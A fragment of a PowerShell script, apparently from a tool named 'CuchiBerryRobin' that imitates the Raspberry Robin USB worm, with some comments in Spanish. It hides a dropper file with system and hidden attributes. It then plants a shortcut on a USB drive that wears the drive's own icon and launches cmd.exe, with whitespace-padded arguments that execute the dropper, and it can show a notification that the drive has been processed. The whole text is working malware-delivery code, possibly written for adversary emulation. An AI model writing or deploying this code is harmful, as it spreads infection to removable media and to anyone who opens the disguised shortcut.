Set-ItemProperty $dropperPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::ReadOnly)



# Escribimos más caracteres absurdos
#Add-Content "$dropperPath" "$caracteres"





# Set the path to where you want to create the shortcut
$shortcutPath = "$driveLetter\$label.lnk"

# Set the character set to use for the random string
$charSet = "CUCHIBERRYROBIN"

# Generate a random string of length 100 using the character set
$description = -join ((Get-Random -Count 100 -InputObject $charSet.ToCharArray()))

# Create a WScript.Shell object
$shell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $shell.CreateShortcut($shortcutPath)

# Set the shortcut properties
# Set the path to the file you want to create a shortcut for
$targetPath = "C:\Windows\System32\cmd.exe"
$shortcut.RelativePath = ""
$shortcut.TargetPath = $targetPath
$shortcut.WindowStyle = 7
$shortcut.Description = $description
# Set the icon to the removable drive icon
$iconLocation = "%SystemRoot%\System32\imageres.dll,27"
$shortcut.IconLocation = $iconLocation
# Set the arguments to run the command from the arg file
$shortcut.Arguments = "
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
          /V/RcmD<$dropperName"

# Save the shortcut
$shortcut.Save()



if ($Conf_Ballon -eq $True) {

#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB CuchiRobineado"
$Type = "info" 
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
   
}
